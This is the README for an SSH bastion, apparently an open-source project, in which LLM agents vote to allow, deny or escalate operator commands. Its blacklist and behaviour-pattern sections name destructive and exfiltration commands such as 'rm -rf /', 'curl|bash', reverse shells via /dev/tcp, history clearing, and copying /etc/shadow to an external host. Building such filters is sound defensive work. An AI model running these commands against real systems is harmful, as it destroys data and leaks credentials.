
# 4SSH_CONTROL — Multi-Agent AI Defense SSH Bastion

SSH-бастион с принципом **«четырёх глаз»**, где роль второго администратора выполняют **три нейросетевых агента** с системой голосования.

Каждая команда, введённая оператором, проходит через многослойный конвейер анализа: мгновенный фильтр правил, параллельную оценку тремя AI-агентами и консенсусное голосование. Опасные команды блокируются автоматически, подозрительные — эскалируются на живого администратора.

---

## Архитектура

```
Admin-1 ──SSH──► Bastion (:2222) ──SSH──► Target Server
                    │
                    ├──► Layer 0: Rule Engine         (< 1 мс)
                    │      ├── Whitelist → auto ALLOW
                    │      ├── Blacklist → auto DENY
                    │      └── Grey zone → передать агентам
                    │
                    ├──► Agent 1: Command Classifier   (параллельно)
                    ├──► Agent 2: Context Analyzer      (параллельно)
                    ├──► Agent 3: Policy Enforcer       (параллельно)
                    │
                    ├──► Consensus Engine (взвешенное голосование)
                    │      ├── ALLOW  → выполнить
                    │      ├── DENY   → заблокировать + алерт
                    │      └── ESCALATE → запросить Admin-2
                    │
                    ├──► Audit Logger (SQLite + JSONL)
                    ├──► Alert Engine (Telegram / Webhook)
                    └──► Dashboard  (http://127.0.0.1:8080)
```

---

## Компоненты

### Layer 0 — Rule Engine

Мгновенный фильтр на regex. Обрабатывает ~80% команд за < 1 мс без обращения к LLM.

- **Whitelist** (18 правил): `ls`, `pwd`, `whoami`, `date`, `uptime`, `df -h`, `ps aux`, `ip a` и др. — мгновенный ALLOW
- **Blacklist** (22 паттерна): `rm -rf /`, fork bomb, `dd if=/dev/`, `mkfs`, `chmod -R 777`, `curl|bash`, `shutdown`, `reboot`, `systemctl stop sshd`, `iptables -F`, `nc -lp`, reverse shell через `/dev/tcp`, `history -c`, `shred`, `visudo` и др. — мгновенный DENY

### Agent 1 — Command Classifier

Быстрая классификация одиночной команды через LLM. Категории: `safe`, `risky`, `destructive`, `recon`, `exfil`, `privesc`.

### Agent 2 — Context Analyzer

Анализирует **цепочку команд** в рамках сессии. Ищет поведенческие паттерны:
- Разведка перед атакой (`ls` → `find` → `cat /etc/passwd`)
- Эксфильтрация данных (`cat sensitive_file` → `base64` → `curl`)
- Сокрытие следов (`history -c`, `unset HISTFILE`)
- Lateral movement (SSH/SCP к другим хостам)
- Privilege escalation (`whoami` → `sudo -l` → `sudo su`)

### Agent 3 — Policy Enforcer

Проверяет соответствие команды политикам доступа:
- **RBAC**: 4 роли (`dev`, `ops`, `dba`, `neteng`) с раздельными allow/deny списками
- **Временные политики**: нерабочие часы (22:00–06:00) = повышенный severity
- **Пользовательские маппинги**: привязка username → role

### Consensus Engine

Агрегирует решения трёх агентов через взвешенное голосование:

| Агент | Вес |
|-------|-----|
| Command Classifier | 1.0 |
| Context Analyzer | 1.5 |
| Policy Enforcer | 1.2 |

Три стратегии (настраивается в `config.yaml`):
- **weighted_majority** — deny при превышении порога (по умолчанию 50%)
- **unanimous** — deny при любом несогласии
- **any_deny** — один deny = блокировка

При разногласии агентов команда **эскалируется** на Admin-2 для ручного решения.

### Audit Logger

- **SQLite** (`audit.db`) — структурированный аудит с индексами по времени, сессии, вердикту
- **JSONL** (`audit.jsonl`) — append-only лог, готовый для SIEM (Elasticsearch, Splunk, Grafana Loki)
- Хранит: команду, вердикт, причину, severity, решения каждого агента с confidence и elapsed_ms

### Alert Engine

- **Telegram Bot** — уведомления о deny/escalate в чат
- **Webhook** — для Slack, PagerDuty, MS Teams и любых HTTP-интеграций

### Dashboard

Веб-панель мониторинга на FastAPI (`http://127.0.0.1:8080`):
- Карточки статистики: всего команд, разрешено, заблокировано, эскалаций, high/critical severity, сессий
- Таблица последних событий с автообновлением (15 сек)
- API endpoints: `/api/stats`, `/api/logs`, `/api/session/{id}`

---

## Быстрый старт

### 1. Установка зависимостей

```bash
pip install -r requirements.txt
```

### 2. Настройка

Отредактируйте `config.yaml`:

```yaml
llm:
  provider: "openai"          # или "ollama"
  model: "gpt-4o-mini"
  api_key: "sk-..."           # или переменная OPENAI_API_KEY
  base_url: ""                # для Ollama: http://localhost:11434/v1
```

Для Ollama (локально, бесплатно):

```bash
ollama pull llama3
```

```yaml
llm:
  provider: "ollama"
  model: "llama3"
  api_key: ""
  base_url: "http://localhost:11434/v1"
```

### 3. Запуск бастиона

```bash
python3 bastion.py --host 192.168.1.100 --user root --password secret
```

### 4. Запуск дашборда (в отдельном терминале)

```bash
python3 dashboard.py
```

### 5. Подключение оператора (Admin-1)

```bash
ssh anyuser@<BASTION_IP> -p 2222
```

---

## Аргументы CLI

| Аргумент | По умолчанию | Описание |
|----------|-------------|----------|
| `--host` | (обязательно) | IP целевого сервера |
| `--user` | (обязательно) | Логин на целевом сервере |
| `--password` | (обязательно) | Пароль на целевом сервере |
| `--port` | `22` | Порт SSH цели |
| `--listen` | `2222` | Порт бастиона |
| `--config` | `config.yaml` | Путь к конфигурации |
| `--role` | — | Роль по умолчанию для подключающихся |

Все параметры можно задать и через `config.yaml` в секции `bastion:`.

---

## Конфигурация (`config.yaml`)

### LLM

```yaml
llm:
  provider: "openai"        # openai | ollama
  model: "gpt-4o-mini"
  api_key: ""
  base_url: ""              # для Ollama: http://localhost:11434/v1
  temperature: 0.1
  timeout: 10
```

### Агенты

```yaml
agents:
  command_classifier:
    enabled: true
    weight: 1.0
  context_analyzer:
    enabled: true
    weight: 1.5
    max_history: 50
  policy_enforcer:
    enabled: true
    weight: 1.2
```

### Консенсус

```yaml
consensus:
  strategy: "weighted_majority"   # weighted_majority | unanimous | any_deny
  deny_threshold: 0.5
  escalate_on_disagreement: true
```

### RBAC

```yaml
rbac:
  roles:
    dev:
      description: "Разработчик"
      allowed_commands: ["ls", "cat", "grep", "tail", "git", "docker logs", "kubectl get"]
      denied_commands: ["rm", "systemctl", "chmod", "iptables"]
    ops:
      allowed_commands: ["*"]
      denied_commands: ["rm -rf /"]
  users:
    admin:
      role: "ops"
    dev_user:
      role: "dev"
  time_policy:
    high_risk_hours:
      start: "22:00"
      end: "06:00"
      timezone: "Europe/Moscow"
      action: "escalate"
```

### Алерты

```yaml
alerts:
  telegram:
    enabled: true
    bot_token: "123456:ABC..."
    chat_id: "-100123456789"
  webhook:
    enabled: true
    url: "https://hooks.slack.com/services/..."
```

---

## Пример работы

### Безопасная команда (whitelist)

```
Admin-1 вводит: ls -la

[AI] Команда: ls -la
  ├─ rule_engine: ALLOW (100%) [low] Базовая команда 'ls' в белом списке
  └─ Итог: ALLOW (0ms)
```

### Опасная команда (blacklist)

```
Admin-1 вводит: rm -rf /

[AI] Команда: rm -rf /
  ├─ rule_engine: DENY (100%) [critical] Рекурсивное удаление от корня
  └─ Итог: DENY (0ms)

Admin-1 видит: [AI DEFENSE] КОМАНДА ЗАБЛОКИРОВАНА
```

### Неоднозначная команда (все 3 агента)

```
Admin-1 вводит: systemctl restart nginx

[AI] Команда: systemctl restart nginx
  ├─ command_classifier: ALLOW (85%) [medium] Перезапуск сервиса — легитимная операция
  │  ⏱ 1200ms
  ├─ context_analyzer: ALLOW (78%) [low] Нет подозрительных паттернов в сессии
  │  ⏱ 1500ms
  ├─ policy_enforcer: ALLOW (90%) [low] Разрешено для роли ops
  │  ⏱ 1100ms
  └─ Итог: ALLOW (1502ms)
```

### Эскалация (AI не уверен)

```
Admin-1 вводит: scp /etc/shadow user@external-host:/tmp/

[AI] Команда: scp /etc/shadow user@external-host:/tmp/
  ├─ command_classifier: DENY (88%) [high] Возможная эксфильтрация
  ├─ context_analyzer: DENY (92%) [high] [Паттерн: data_exfiltration]
  ├─ policy_enforcer: ESCALATE (60%) [medium] Не в списке разрешённых
  └─ Итог: ESCALATE

╔═══ ЭСКАЛАЦИЯ ═══════════════════════════════╗
║ AI не уверен. Требуется решение Admin-2.    ║
║ Команда: scp /etc/shadow ...                ║
╚═════════════════════════════════════════════╝
[ЭСКАЛАЦИЯ] Разрешить? [y/n]:
```

---

## Структура проекта

```
4SSH_CONTROL/
├── bastion.py                       # Главный бастион с AI-защитой
├── dashboard.py                     # Запуск веб-дашборда
├── config.yaml                      # Конфигурация системы
├── requirements.txt                 # Зависимости Python
├── ai_defense/
│   ├── agents/
│   │   ├── command_classifier.py    # Agent 1: классификация команд
│   │   ├── context_analyzer.py      # Agent 2: контекст сессии
│   │   └── policy_enforcer.py       # Agent 3: RBAC + политики
│   ├── core/
│   │   ├── config.py                # Загрузка и парсинг конфигурации
│   │   ├── models.py                # Verdict, Session, AgentDecision
│   │   ├── rule_engine.py           # Layer 0: whitelist / blacklist
│   │   ├── llm_client.py            # Клиент OpenAI / Ollama
│   │   ├── consensus.py             # Голосование агентов
│   │   ├── engine.py                # AI Engine (оркестратор)
│   │   ├── audit.py                 # SQLite + JSONL аудит
│   │   └── alerts.py                # Telegram + webhook
│   └── web/
│       └── dashboard.py             # FastAPI веб-панель
├── main.py                          # (Legacy) Ручной контроллер
├── secmain.py                       # (Legacy) Интерактивный контроллер
└── Схема PoC.md                     # Описание оригинальной концепции
```

---

## Legacy-скрипты

Оригинальные скрипты с ручным контролем сохранены для совместимости:

- **`main.py`** — Admin-2 вручную подтверждает/отклоняет каждую команду (`y`/`n`)
- **`secmain.py`** — то же + Admin-2 может вводить команды напрямую в сессию

Для запуска legacy-режима:

```bash
python3 main.py --host <TARGET_IP> --user <USER> --password <PASS>
python3 secmain.py --host <TARGET_IP> --user <USER> --password <PASS>
```

---

## Требования

- Python 3.10+
- Зависимости: `paramiko`, `openai`, `pyyaml`, `fastapi`, `uvicorn`, `aiohttp`, `aiosqlite`, `jinja2`
- Для LLM: API-ключ OpenAI **или** локальный Ollama

